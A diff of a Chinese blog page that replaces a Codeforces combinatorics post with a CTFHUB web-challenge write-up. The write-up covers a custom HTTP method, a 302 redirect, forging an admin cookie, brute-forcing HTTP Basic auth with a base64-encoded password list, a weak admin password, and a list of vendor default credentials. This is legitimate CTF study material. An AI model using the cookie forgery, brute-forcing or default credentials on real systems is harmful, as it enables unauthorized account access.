@@ -6,18 +6,20 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="https://www.wchhlbt.cn">
-  <title>codeforces 785D Anton and School - 2（组合恒等式） | wchhlbt-个人小站</title>
+  <title>CTFHUB Web方向题解 | wchhlbt-个人小站</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="题目大意：http:&#x2F;&#x2F;codeforces.com&#x2F;problemset&#x2F;problem&#x2F;785&#x2F;DAs you probably know, Anton goes to school. One of the school subjects that Anton studies is Bracketology. On the Bracketology lessons students usual">
-<meta name="keywords" content="ACM-ICPC">
+  <meta name="description" content="记录一下在CTFHUB上面刷题和学习过程。欢迎大家分享交流～">
+<meta name="keywords" content="CTF">
 <meta property="og:type" content="article">
-<meta property="og:title" content="codeforces 785D Anton and School - 2（组合恒等式）">
-<meta property="og:url" content="https:&#x2F;&#x2F;www.wchhlbt.cn&#x2F;2018&#x2F;11&#x2F;19&#x2F;codeforces%20785D%20Anton%20and%20School%20-%202%EF%BC%88%E7%BB%84%E5%90%88%E6%81%92%E7%AD%89%E5%BC%8F%EF%BC%89&#x2F;index.html">
+<meta property="og:title" content="CTFHUB Web方向题解">
+<meta property="og:url" content="https:&#x2F;&#x2F;www.wchhlbt.cn&#x2F;2020&#x2F;09&#x2F;17&#x2F;CTFHUB-Web%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3&#x2F;index.html">
 <meta property="og:site_name" content="wchhlbt-个人小站">
-<meta property="og:description" content="题目大意：http:&#x2F;&#x2F;codeforces.com&#x2F;problemset&#x2F;problem&#x2F;785&#x2F;DAs you probably know, Anton goes to school. One of the school subjects that Anton studies is Bracketology. On the Bracketology lessons students usual">
+<meta property="og:description" content="记录一下在CTFHUB上面刷题和学习过程。欢迎大家分享交流～">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-11-19T05:34:21.030Z">
+<meta property="og:image" content="https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;wchhlbt&#x2F;MyPostImg&#x2F;master&#x2F;ctfhub_authentication.png">
+<meta property="og:updated_time" content="2020-09-17T14:47:17.047Z">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;wchhlbt&#x2F;MyPostImg&#x2F;master&#x2F;ctfhub_authentication.png">
   
     <link rel="alternative" href="/atom.xml" title="wchhlbt-个人小站" type="application/atom+xml">
   
@@ -159,20 +161,20 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-codeforces 785D Anton and School - 2（组合恒等式）" class="article article-type-post " itemscope itemprop="blogPost">
+            <article id="post-CTFHUB-Web方向题解" class="article article-type-post " itemscope itemprop="blogPost">
   <div class="article-inner">
     
       <header class="article-header">
         
   
     <h1 class="article-title" itemprop="name">
-      codeforces 785D Anton and School - 2（组合恒等式）
+      CTFHUB Web方向题解
     </h1>
   
 
         
-        <a href="/2018/11/19/codeforces%20785D%20Anton%20and%20School%20-%202%EF%BC%88%E7%BB%84%E5%90%88%E6%81%92%E7%AD%89%E5%BC%8F%EF%BC%89/" class="archive-article-date">
-  	<time datetime="2018-11-19T05:30:05.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2018-11-19</time>
+        <a href="/2020/09/17/CTFHUB-Web%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/" class="archive-article-date">
+  	<time datetime="2020-09-17T03:41:13.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-09-17</time>
 </a>
         
         <!-- 添加代码 -->
@@ -186,19 +188,31 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p><strong>题目大意：</strong><a href="http://codeforces.com/problemset/problem/785/D" target="_blank" rel="noopener">http://codeforces.com/problemset/problem/785/D</a><br>As you probably know, Anton goes to school. One of the school subjects that Anton studies is Bracketology. On the Bracketology lessons students usually learn different sequences that consist of round brackets (characters “(“ and “)” (without quotes)).<br>On the last lesson Anton learned about the regular simple bracket sequences (RSBS). A bracket sequence s of length n is an RSBS if the following conditions are met:<br>It is not empty (that is n ≠ 0). </p>
+        <p>记录一下在CTFHUB上面刷题和学习过程。欢迎大家分享交流～</p>
 <a id="more"></a> 
 
-<p>The length of the sequence is even.<br>First  charactes of the sequence are equal to “(“.<br>Last  charactes of the sequence are equal to “)”.<br>For example, the sequence “((()))” is an RSBS but the sequences “((())” and “(()())” are not RSBS.<br>Elena Ivanovna, Anton’s teacher, gave him the following task as a homework. Given a bracket sequence s. Find the number of its distinct subsequences such that they are RSBS. Note that a subsequence of s is a string that can be obtained from s by deleting some of its elements. Two subsequences are considered distinct if distinct sets of positions are deleted.<br>Because the answer can be very big and Anton’s teacher doesn’t like big numbers, she asks Anton to find the answer modulo 109 + 7.<br>Anton thought of this task for a very long time, but he still doesn’t know how to solve it. Help Anton to solve this task and write a program that finds the answer for it!<br>Input<br>The only line of the input contains a string s — the bracket sequence given in Anton’s homework. The string consists only of characters “(“ and “)” (without quotes). It’s guaranteed that the string is not empty and its length doesn’t exceed 200 000.<br>Output<br>Output one number — the answer for the task modulo 109 + 7</p>
-<p><strong>解题思路：</strong></p>
-<ul>
-<li>O( n )的预处理。很显然需要统计一下每个位置前面的（有多少个，后面的）有多少个，才可以方便计数。</li>
-<li>算出对每一个位置前后的（）有多少种匹配，为了保证不重复，所以我们要求一定要使用当前位置的（，设当前位置前面有n个（包括本身，后面有m个）。所以对于每一个（出现的位置，可能有的总的组合数为 $ \sum_{i=1}^{n}(C_{n-1}^{i-1} * C_m^i) $ 如果 n&gt;m ，对应位置组合数为0，结论不变。</li>
-<li>$ \sum_{i=1}^{n}(C_{n-1}^{i-1} * C_m^i) $ = $ \sum_{i=1}^{n}(C_{n-1}^{n-i} * C_m^i) $ = $ C_{n+m-1}^{n} $ (最后一步由范德蒙恒等式证) 并且由最后的结果可以看出</li>
-<li>本题还有一个关键就是求逆元，求解逆元有多种方式费马小定理、拓展欧几里得。这里提供一种O（n）求出1-n阶乘逆元的方法<br>先用任意一种方式求出 n! 的逆元<br>然后$ i !^{-1} \equiv  (i+1)!^{-1}* (i+1) \pmod{p}$<br>证明如下<br>$(i+1)!^{-1} \equiv  i !^{-1} * (i+1)^{-1} \pmod{p}$<br>$ i !^{-1} \equiv  (i+1)!^{-1}* (i+1)^{-1^{-1}}\pmod{p}$</li>
-</ul>
-<p>这里还有两篇讲解逆元的文章大家感兴趣可以看下<a href="http://blog.csdn.net/daniel_csdn/article/details/50783734" target="_blank" rel="noopener">http://blog.csdn.net/daniel_csdn/article/details/50783734</a><br><a href="http://blog.miskcoo.com/2014/09/linear-find-all-invert" target="_blank" rel="noopener">http://blog.miskcoo.com/2014/09/linear-find-all-invert</a><br>不过第一篇文章的方法三似乎是错的。<br><strong>AC代码</strong></p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">    @Author: wchhlbt</span></span><br><span class="line"><span class="comment">    @Date:   2017/3/18</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Fori(x) for(int i=0;i&lt;x;i++)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> Forj(x) for(int j=0;j&lt;x;j++)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200000</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> inf 0x3f3f3f3f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ONES(x) __builtin_popcount(x)</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">long</span> <span class="keyword">long</span> ll ;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">double</span> eps =<span class="number">1e-8</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> mod = <span class="number">1000000007</span>;</span><br><span class="line"><span class="keyword">typedef</span> pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; P;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">double</span> PI = <span class="built_in">acos</span>(<span class="number">-1.0</span>);</span><br><span class="line"><span class="keyword">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">-1</span>&#125;;</span><br><span class="line"><span class="keyword">int</span> dy[<span class="number">4</span>] = &#123;<span class="number">1</span>,<span class="number">-1</span>,<span class="number">0</span>,<span class="number">0</span>&#125;;</span><br><span class="line"></span><br><span class="line">ll fac[maxn+<span class="number">7</span>],inv[maxn+<span class="number">7</span>];</span><br><span class="line"><span class="keyword">int</span> l[maxn+<span class="number">7</span>],r[maxn+<span class="number">7</span>];</span><br><span class="line"><span class="keyword">char</span> s[maxn+<span class="number">7</span>];</span><br><span class="line"></span><br><span class="line"><span class="function">ll <span class="title">quickpow</span><span class="params">(ll m,ll n,ll k)</span>     <span class="comment">// return m^n % k</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ll b = <span class="number">1</span>;</span><br><span class="line">    m = m%k;</span><br><span class="line">    <span class="keyword">while</span> (n &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">          <span class="keyword">if</span> (n &amp; <span class="number">1</span>)</span><br><span class="line">             b = (b*m)%k;</span><br><span class="line">          n = n &gt;&gt; <span class="number">1</span> ;</span><br><span class="line">          m = (m*m)%k;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">ll <span class="title">cal</span><span class="params">(ll n, ll m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//cout &lt;&lt; inv[n] &lt;&lt; " " &lt;&lt; inv[m-1] &lt;&lt; endl;</span></span><br><span class="line">    <span class="keyword">return</span> fac[n+m<span class="number">-1</span>] * inv[n] % mod * inv[m<span class="number">-1</span>] % mod;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//freopen("test.txt","r",stdin);</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%s"</span>,s+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(s+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i&lt;=len; i++)</span><br><span class="line">        l[i] = l[i<span class="number">-1</span>] + (s[i]==<span class="string">'('</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = len; i&gt;=<span class="number">1</span>; i--)</span><br><span class="line">        r[i] = r[i+<span class="number">1</span>] + (s[i]==<span class="string">')'</span>);</span><br><span class="line">    fac[<span class="number">0</span>] = <span class="number">1</span>; inv[<span class="number">0</span>] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i&lt;=maxn+<span class="number">5</span>; i++)&#123;</span><br><span class="line">        fac[i] = i*fac[i<span class="number">-1</span>]%mod;</span><br><span class="line">    &#125;</span><br><span class="line">    inv[maxn+<span class="number">5</span>] = quickpow(fac[maxn+<span class="number">5</span>], mod<span class="number">-2</span>, mod);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = maxn+<span class="number">4</span>; i&gt;=<span class="number">0</span>; i--)</span><br><span class="line">        inv[i] = inv[i+<span class="number">1</span>] * (i+<span class="number">1</span>) % mod;</span><br><span class="line">    ll ans = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">1</span>; i&lt;=len; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">'('</span>)</span><br><span class="line">            ans = (ans + cal(l[i], r[i]) ) % mod;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%I64d\n"</span>,ans);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="1-HTTP协议"><a href="#1-HTTP协议" class="headerlink" title="1 HTTP协议"></a>1 HTTP协议</h1><h2 id="1-1-请求方式"><a href="#1-1-请求方式" class="headerlink" title="1.1 请求方式"></a>1.1 请求方式</h2><p>本题主要是考察用自定义的请求方法，发起请求。可以使用requests库或者用burpsuite构造请求发送都可以。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Request, Session</span><br><span class="line"></span><br><span class="line"><span class="comment"># r  = requests.get('http://challenge-5afc155f1d93f32a.sandbox.ctfhub.com:10080/index.php')</span></span><br><span class="line">s = Session()</span><br><span class="line">request = Request(<span class="string">'CTFHUB'</span>, <span class="string">'http://challenge-5afc155f1d93f32a.sandbox.ctfhub.com:10080/index.php'</span>)</span><br><span class="line">prepped = request.prepare()</span><br><span class="line">response = s.send(prepped, timeout=<span class="number">5</span>)</span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-2-302跳转"><a href="#1-2-302跳转" class="headerlink" title="1.2 302跳转"></a>1.2 302跳转</h2><p>打开F12，可以看到有一个302跳转从index.php跳转到index.html。猜测可能答案与index.php有关。用curl命令看一下http response.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">curl -v http://challenge-b8a4ac0891aac6dd.sandbox.ctfhub.com:10080/index.php</span><br><span class="line">*   Trying 47.98.148.7...</span><br><span class="line">* TCP_NODELAY <span class="built_in">set</span></span><br><span class="line">* Connected to challenge-b8a4ac0891aac6dd.sandbox.ctfhub.com (47.98.148.7) port 10080 (<span class="comment">#0)</span></span><br><span class="line">&gt; GET /index.php HTTP/1.1</span><br><span class="line">&gt; Host: challenge-b8a4ac0891aac6dd.sandbox.ctfhub.com:10080</span><br><span class="line">&gt; User-Agent: curl/7.54.0</span><br><span class="line">&gt; Accept: */*</span><br><span class="line">&gt; </span><br><span class="line">&lt; HTTP/1.1 302 Moved Temporarily</span><br><span class="line">&lt; Server: openresty/1.15.8.2</span><br><span class="line">&lt; Date: Thu, 17 Sep 2020 07:22:59 GMT</span><br><span class="line">&lt; Content-Type: text/html; charset=UTF-8</span><br><span class="line">&lt; Transfer-Encoding: chunked</span><br><span class="line">&lt; Connection: keep-alive</span><br><span class="line">&lt; X-Powered-By: PHP/5.6.40</span><br><span class="line">&lt; Location: /index.html</span><br><span class="line">&lt; Access-Control-Allow-Origin: *</span><br><span class="line">&lt; Access-Control-Allow-Headers: X-Requested-With</span><br><span class="line">&lt; Access-Control-Allow-Methods: *</span><br><span class="line">&lt; </span><br><span class="line">ctfhub&#123;046c99983389062b35ff89563c35b74118ab2c68&#125;</span><br><span class="line">* Connection <span class="comment">#0 to host challenge-b8a4ac0891aac6dd.sandbox.ctfhub.com left intact</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="1-3-Cookie"><a href="#1-3-Cookie" class="headerlink" title="1.3 Cookie"></a>1.3 Cookie</h2><p>只需要打开F12看一下，有一个set-Cookie admin=0，结合页面上的提示，我们把cookie修改成admin=1，重新发送就成功了。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> Request, Session</span><br><span class="line">cookies=&#123;&#125;</span><br><span class="line">cookies[<span class="string">'admin'</span>] = <span class="string">'1'</span></span><br><span class="line"><span class="comment"># r  = requests.get('http://challenge-5afc155f1d93f32a.sandbox.ctfhub.com:10080/index.php')</span></span><br><span class="line">r = requests.get(<span class="string">"http://challenge-8d84b618dcd65729.sandbox.ctfhub.com:10080/"</span>,cookies=cookies)</span><br><span class="line">print(r.text)</span><br></pre></td></tr></table></figure>
+
+<h2 id="1-4-身份验证"><a href="#1-4-身份验证" class="headerlink" title="1.4 身份验证"></a>1.4 身份验证</h2><p><a href="https://zh.wikipedia.org/wiki/HTTP%E5%9F%BA%E6%9C%AC%E8%AE%A4%E8%AF%81" target="_blank" rel="noopener">基础认证</a></p>
+<p>从题目中给的链接可以嘘唏到HTTP基本认证的相关知识，然后通过查看服务器发过来的response头，其中有很明显的提示用户名为admin，接下来就很简单了，下载题目附件，用burpsuite爆破。但是要注意把字典编码成base64的。</p>
+<p><a href="https://writeup.ctfhub.com/Skill/Web/%E5%89%8D%E7%BD%AE%E6%8A%80%E8%83%BD/HTTP%E5%8D%8F%E8%AE%AE/c24bba25.html" target="_blank" rel="noopener">官方题解</a></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'10_million_password_list_top_100.txt'</span>,<span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">'password1.txt'</span>,<span class="string">'w'</span>) <span class="keyword">as</span> f1:</span><br><span class="line">        lines = f.readlines()</span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> lines:</span><br><span class="line">            line = line.strip()</span><br><span class="line">            line = <span class="string">'admin:'</span>+line</span><br><span class="line">            line = line.encode(encoding=<span class="string">"utf-8"</span>)</span><br><span class="line">            <span class="comment"># print()</span></span><br><span class="line">            f1.write(str(base64.b64encode(line),<span class="string">"utf-8"</span>) + <span class="string">'\n'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>爆破结果如下：</p>
+<img src="https://raw.githubusercontent.com/wchhlbt/MyPostImg/master/ctfhub_authentication.png" alt="爆破结果" style="zoom:50%;" />
+
+
+
+<h1 id="2-密码口令"><a href="#2-密码口令" class="headerlink" title="2 密码口令"></a>2 密码口令</h1><h2 id="2-1-弱口令"><a href="#2-1-弱口令" class="headerlink" title="2.1 弱口令"></a>2.1 弱口令</h2><p>这个就是一个基本的弱口令爆破，但是需要一点小技巧，用户名不要暴力尝试，那样成功率太低，默认为admin或者root，枚举一下密码就可以了。最后我拿到口令的用户名和密码是「user=admin」「password=admin123」</p>
+<h2 id="2-2-默认口令"><a href="#2-2-默认口令" class="headerlink" title="2.2 默认口令"></a>2.2 默认口令</h2><p>这个居然真的直接搜一下默认口令就能找到23333</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">eyouuser	eyou_admin</span><br><span class="line">eyougw	admin@(eyou)</span><br><span class="line">admin	+-ccccc</span><br><span class="line">admin	cyouadmin</span><br></pre></td></tr></table></figure>
 
 
       
@@ -234,7 +248,7 @@
 		<ul class="article-tag-list">
 			 
         		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color4">ACM-ICPC</a>
+        			<a href="javascript:void(0)" target="_blank" rel="noopener" class="js-tag article-tag-list-link color4">CTF</a>
         		</li>
       		
 		</ul>
@@ -291,7 +305,7 @@
     <a class="close js-modal-close" href="javascript:;" target="_blank" rel="noopener"><i class="icon icon-close"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//pan.baidu.com/share/qrcode?url=https://www.wchhlbt.cn/2018/11/19/codeforces%20785D%20Anton%20and%20School%20-%202%EF%BC%88%E7%BB%84%E5%90%88%E6%81%92%E7%AD%89%E5%BC%8F%EF%BC%89/" alt="微信分享二维码">
+      <img src="//pan.baidu.com/share/qrcode?url=https://www.wchhlbt.cn/2020/09/17/CTFHUB-Web%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -305,18 +319,9 @@
   
 <nav id="article-nav">
   
-    <a href="/2018/11/27/%E5%88%A9%E7%94%A8postfix%E6%90%AD%E5%BB%BA%E9%82%AE%E4%BB%B6%E6%9C%8D%E5%8A%A1%E5%99%A8/" id="article-nav-newer" class="article-nav-link-wrap">
-      <i class="icon-circle-left"></i>
-      <div class="article-nav-title">
-        
-          利用postfix搭建邮件服务器
-        
-      </div>
-    </a>
   
-  
-    <a href="/2018/11/19/hexo-%E9%85%8D%E7%BD%AE/" id="article-nav-older" class="article-nav-link-wrap">
-      <div class="article-nav-title">hexo 配置</div>
+    <a href="/2020/06/28/requests%E5%BA%93%E5%AD%A6%E4%B9%A0/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">requests库学习</div>
       <i class="icon-circle-right"></i>
     </a>
   
@@ -344,7 +349,7 @@
   
   <div class="duoshuo">
 	<!-- 多说评论框 start -->
-	<div class="ds-thread" data-thread-key="codeforces 785D Anton and School - 2（组合恒等式）" data-title="codeforces 785D Anton and School - 2（组合恒等式）" data-url="https://www.wchhlbt.cn/2018/11/19/codeforces%20785D%20Anton%20and%20School%20-%202%EF%BC%88%E7%BB%84%E5%90%88%E6%81%92%E7%AD%89%E5%BC%8F%EF%BC%89/"></div>
+	<div class="ds-thread" data-thread-key="CTFHUB-Web方向题解" data-title="CTFHUB Web方向题解" data-url="https://www.wchhlbt.cn/2020/09/17/CTFHUB-Web%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/"></div>
 	<!-- 多说评论框 end -->
 	<!-- 多说公共JS代码 start (一个网页只需插入一次) -->
 	<script type="text/javascript">
